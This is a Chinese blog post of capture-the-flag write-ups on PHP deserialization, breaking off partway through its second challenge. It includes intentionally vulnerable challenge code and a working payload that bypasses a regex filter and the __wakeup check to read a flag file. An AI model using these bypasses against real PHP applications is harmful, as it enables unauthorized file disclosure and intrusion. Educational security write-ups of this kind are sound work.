<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>CTF-反序列化 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.5.3","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Extraderの博客" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="PHPphp中常用的几种魔术方法和触发条件 __construct ：当一个对象创建时被调用 __destruct ：当一个对象销毁时被调用 __toString ：当一个类或对象被当作一个字符串被调用 __wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发 __sleep ：当一个对象使用 serialize 时触发，序列化时触发 __get ：当一个对象读取不可访问">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-反序列化">
<meta property="og:url" content="https://www.extrader.top/posts/d3333ead/index.html">
<meta property="og:site_name" content="Extraderの博客">
<meta property="og:description" content="PHPphp中常用的几种魔术方法和触发条件 __construct ：当一个对象创建时被调用 __destruct ：当一个对象销毁时被调用 __toString ：当一个类或对象被当作一个字符串被调用 __wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发 __sleep ：当一个对象使用 serialize 时触发，序列化时触发 __get ：当一个对象读取不可访问">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png">
<meta property="article:published_time" content="2020-04-01T16:00:00.000Z">
<meta property="article:modified_time" content="2020-11-07T03:30:44.070Z">
<meta property="article:author" content="Extrader">
<meta property="article:tag" content="CTF题">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png"><script src="/js/ui/mode.js"></script><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">47</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-php-unserialize"><span class="toc-number">1.1.</span> <span class="toc-text">Web_php_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%E2%80%94PHP"><span class="toc-number">1.2.</span> <span class="toc-text">极客大挑战-2019—PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF%E2%80%94Ezpop"><span class="toc-number">1.3.</span> <span class="toc-text">MRCTF—Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">1.4.</span> <span class="toc-text">0CTF 2016-piapiapia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-number">1.5.</span> <span class="toc-text">NPUCTF2020-ReadlezPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">1.6.</span> <span class="toc-text">安洵杯-2019-easy_serialize_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">1.7.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020-%E7%AC%AC%E5%9B%9B%E5%B1%8A-%E5%BC%BA%E7%BD%91%E6%9D%AF-web%E8%BE%85%E5%8A%A9"><span class="toc-number">1.8.</span> <span class="toc-text">[2020 第四届 强网杯]-web辅助</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">2.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2%E2%80%94ikun"><span class="toc-number">2.1.</span> <span class="toc-text">CISCN2019-华北赛区-Day1-Web2—ikun</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/d3333ead/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-反序列化</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-04-02 00:00:00" itemprop="dateCreated datePublished" datetime="2020-04-02T00:00:00+08:00">2020-04-02</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-11-07 11:30:44" itemprop="dateModified" datetime="2020-11-07T11:30:44+08:00">2020-11-07</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题</span></a><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php中常用的几种魔术方法和触发条件</p>
<pre class="language-php" data-language="php"><code class="language-php">__construct ：当一个对象创建时被调用
__destruct ：当一个对象销毁时被调用
__toString ：当一个类或对象被当作一个字符串被调用
__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发
__sleep ：当一个对象使用 serialize 时触发，序列化时触发
__get ：当一个对象读取不可访问属性的值时触发
__set ：当一个对象在给不可访问属性赋值时
__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发
__unset ：当一个对象对不可访问属性调用 unset 时触发
__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发
__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用
__call ：当一个对象在对象上下文中调用不可访问的方法时触发 
__callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</code></pre>

<p>不同属性之间的区别</p>
<pre class="language-php" data-language="php"><code class="language-php">public  变量（公有） 
直接将变量名反序列化出来 
protected  变量（受保护） 
\x00 + * + \x00 + 变量名 
private  变量（私有） 
\x00 + 类名 + \x00 + 变量名</code></pre>

<a id="more"></a>

<hr>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1">链接</a></p>
<p>题目代码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
class Demo &#123; 
    private $file &#x3D; &#39;index.php&#39;;
    public function __construct($file) &#123; 
        $this-&gt;file &#x3D; $file; 
    &#125;
    function __destruct() &#123; 
        echo @highlight_file($this-&gt;file, true); 
    &#125;
    function __wakeup() &#123; 
        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123; 
            &#x2F;&#x2F;the secret is in the fl4g.php
            $this-&gt;file &#x3D; &#39;index.php&#39;; 
        &#125; 
    &#125; 
&#125;
if (isset($_GET[&#39;var&#39;])) &#123; 
    $var &#x3D; base64_decode($_GET[&#39;var&#39;]); 
    if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123; 
        die(&#39;stop hacking!&#39;); 
    &#125; else &#123;
        @unserialize($var); 
    &#125; 
&#125; else &#123; 
    highlight_file(&quot;index.php&quot;); 
&#125; 
?&gt;</code></pre>

<p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p>
<p>题目限制条件：</p>
<blockquote>
<p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p>
<p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p>
</blockquote>
<p>可是这两种方法都可以进行绕过：</p>
<blockquote>
<p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p>
<p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p>
</blockquote>
<p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p>
<pre class="language-php" data-language="php"><code class="language-php">序列化后：
v1 表示 public   %00Demo%00v2 表示 private(Demo为类名)   %00*%00v3 表示 protected  v1,v2,v3为属性名</code></pre>

<p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<blockquote>
<p>参考：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8f498198fc3d">php序列化与反序列化入门</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kacha886/p/9115503.html">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html">__wakeup()函数漏洞以及实际漏洞分析</a></p>
</blockquote>
<p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p>
<hr>
<h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt loading="lazy"></p>
<p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p>
<p>index.php</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  ......
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    ......
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 85%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 440px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>不愧是我！！！
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 640px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token prolog">&lt;?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 5%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 99%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font</span><span class="token punctuation">:</span>italic 15px Georgia<span class="token punctuation">,</span>serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre>

<p>class.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
include &#39;flag.php&#39;;

error_reporting(0);

class Name&#123;
    private $username &#x3D; &#39;nonono&#39;;
    private $password &#x3D; &#39;yesyes&#39;;

    public function __construct($username,$password)&#123;
        $this-&gt;username &#x3D; $username;
